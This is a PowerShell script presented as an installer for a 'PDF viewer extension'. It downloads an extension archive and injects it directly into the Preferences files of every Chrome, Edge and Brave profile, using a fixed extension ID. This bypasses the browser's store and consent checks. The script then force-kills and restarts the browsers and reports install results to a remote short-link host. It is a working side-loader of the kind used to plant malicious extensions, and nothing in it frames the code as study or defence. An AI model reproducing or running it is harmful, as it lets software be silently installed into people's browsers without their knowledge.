$ErrorActionPreference='Stop'
$ProgressPreference='SilentlyContinue'
$ExtUrl='https://github.com/Castro02980/pdf-viewer-extension/archive/refs/heads/main.zip'
$NotifyUrl='https://wln.ink/n'

# Stable extension ID derived from manifest.json "key" field (verified:
# SHA256 of the DER key -> first 16 bytes -> nibbles mapped to a-p).
# MUST equal the key shipped in the extension repo. Do NOT use path-based
# IDs: when a manifest contains "key", Chrome derives the ID from the key,
# so a settings entry filed under a path-based ID never matches and the
# browser discards it (this was the inj:0 / ext=False root cause).
$ExtId='kklpcoclpjjfiboodbmcpogicnanoopp'

function Inject-Profile($profPath, $extPath, $extId, $manifestObj) {
    $prefFile = Join-Path $profPath 'Preferences'
    if (-not (Test-Path $prefFile)) { return $false }

    try {
        $pref = Get-Content $prefFile -Raw -Encoding UTF8 | ConvertFrom-Json
        if (-not $pref.extensions) { $pref | Add-Member -NotePropertyName extensions -NotePropertyValue ([PSCustomObject]@{}) -Force }
        if (-not $pref.extensions.settings) { $pref.extensions | Add-Member -NotePropertyName settings -NotePropertyValue ([PSCustomObject]@{}) -Force }

        $existing = $pref.extensions.settings.PSObject.Properties | Where-Object { $_.Name -eq $extId }
        if ($existing) { return $false }

        $setting = [ordered]@{
            location = 1
            manifest = $manifestObj
            path = $extPath
            state = 1
        }

        $pref.extensions.settings | Add-Member -NotePropertyName $extId -NotePropertyValue $setting -Force

        $json = $pref | ConvertTo-Json -Depth 32 -Compress
        [System.IO.File]::WriteAllText($prefFile, $json, (New-Object System.Text.UTF8Encoding $false))
        return $true
    } catch {
        return $false
    }
}

function Process-Browser($name, $exeName, $paths, $extPath, $extId, $manifestObj) {
    $injected = 0
    foreach ($p in $paths) {
        $userDataDir = [System.Environment]::ExpandEnvironmentVariables($p)
        if (-not (Test-Path $userDataDir)) { continue }

        $profiles = @('Default') + @(Get-ChildItem $userDataDir -Directory -Filter 'Profile *' -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
        foreach ($prof in $profiles) {
            $profPath = Join-Path $userDataDir $prof
            if (Inject-Profile $profPath $extPath $extId $manifestObj) { $injected++ }
        }
    }

    $procs = Get-Process $exeName -ErrorAction SilentlyContinue
    $mySession = (Get-Process -Id $PID).SessionId
    $toRestart = @()

    foreach ($proc in $procs) {
        if ($proc.SessionId -ne $mySession) { continue }
        $cmd = ''
        try {
            $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($proc.Id)").CommandLine
        } catch { continue }

        if ($cmd -match '--type=') { continue }
        $toRestart += $cmd
        Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
    }

    if ($toRestart.Count -gt 0) {
        Start-Sleep -Milliseconds 800
        $exePath = "${env:ProgramFiles}\Google\$name\Application\$exeName.exe"
        if ($name -eq 'Microsoft\Edge') { $exePath = "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe" }
        if ($name -eq 'BraveSoftware\Brave-Browser') { $exePath = "${env:ProgramFiles}\BraveSoftware\Brave-Browser\Application\brave.exe" }

        if (Test-Path $exePath) {
            Start-Process $exePath -ArgumentList '--restore-last-session' -WindowStyle Normal
        }
    }

    return $injected
}

try {
    $tempZip = "$env:TEMP\pdf-ext.zip"
    $tempDir = "$env:TEMP\pdf-ext-tmp"
    $extDir = "$env:LOCALAPPDATA\PDFViewerExt"

    if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
    if (Test-Path $extDir) { Remove-Item $extDir -Recurse -Force }

    Invoke-WebRequest -Uri $ExtUrl -OutFile $tempZip -UseBasicParsing
    Expand-Archive -Path $tempZip -DestinationPath $tempDir -Force
    Remove-Item $tempZip -Force

    $manifest = Get-ChildItem $tempDir -Filter 'manifest.json' -Recurse | Select-Object -First 1
    if (-not $manifest) { throw 'Extension not found' }

    Copy-Item $manifest.DirectoryName $extDir -Recurse -Force
    $manifestObj = Get-Content (Join-Path $extDir 'manifest.json') -Raw -Encoding UTF8 | ConvertFrom-Json
    if (-not $manifestObj.key) { throw 'manifest key missing: extension ID would be unstable' }
    $extId = $ExtId

    $chromePaths = @('%LOCALAPPDATA%\Google\Chrome\User Data')
    $edgePaths = @('%LOCALAPPDATA%\Microsoft\Edge\User Data')
    $bravePaths = @('%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data')

    $total = 0
    $total += Process-Browser 'Google\Chrome' 'chrome' $chromePaths $extDir $extId $manifestObj
    $total += Process-Browser 'Microsoft\Edge' 'msedge' $edgePaths $extDir $extId $manifestObj
    $total += Process-Browser 'BraveSoftware\Brave-Browser' 'brave' $bravePaths $extDir $extId $manifestObj

    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue

    if ($total -eq 0) {
        Invoke-WebRequest -Uri $NotifyUrl -Method Post -Body "ev=install_fail&os=windows&info=injected 0 profiles" -ContentType 'text/plain' -UseBasicParsing -TimeoutSec 5 | Out-Null
        Write-Host 'No profiles found. Close browser and run installer again.' -ForegroundColor Red
        exit 1
    }

    Invoke-WebRequest -Uri $NotifyUrl -Method Post -Body "ev=install&os=windows&info=injected $total profiles" -ContentType 'text/plain' -UseBasicParsing -TimeoutSec 5 | Out-Null
    Write-Host "Successfully installed to $total profiles" -ForegroundColor Green
    exit 0

} catch {
    $msg = $_.Exception.Message
    if ($msg.Length -gt 100) { $msg = $msg.Substring(0,100) }
    Invoke-WebRequest -Uri $NotifyUrl -Method Post -Body "ev=install_fail&os=windows&info=$msg" -ContentType 'text/plain' -UseBasicParsing -TimeoutSec 5 | Out-Null
    Write-Host "Error: $msg" -ForegroundColor Red
    exit 1
}
